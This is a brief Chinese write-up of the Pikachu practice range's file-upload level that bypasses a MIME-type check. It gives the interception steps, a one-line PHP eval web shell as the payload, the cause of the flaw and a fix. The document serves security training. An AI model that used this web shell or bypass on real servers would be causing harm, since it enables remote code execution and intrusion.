# Pikachu | 文件上传 MIME类型校验
## 一、漏洞简介
服务端只校验请求头里的Content-Type，判断是不是图片类型，后缀不校验。
## 二、环境信息
靶场地址：http://127.0.0.1/pikachu/
关卡路径：/vul/upload/upload_mime.php
## 三、复现步骤
1. 准备php一句话木马，BP抓包上传
2. 修改请求头Content-Type为 `image/jpeg`
3. 放行数据包，php文件上传成功
## 四、Payload
`<?php @eval($_POST['pass']);?>`
## 五、漏洞原理
Content-Type是客户端可控字段，可以随便修改，只靠这个判断非常不安全。
## 六、修复方案
校验文件后缀、文件头部特征，不要信任MIME头。
## 七、总结
MIME类型由浏览器提交，攻击者抓包随便改，很容易绕过。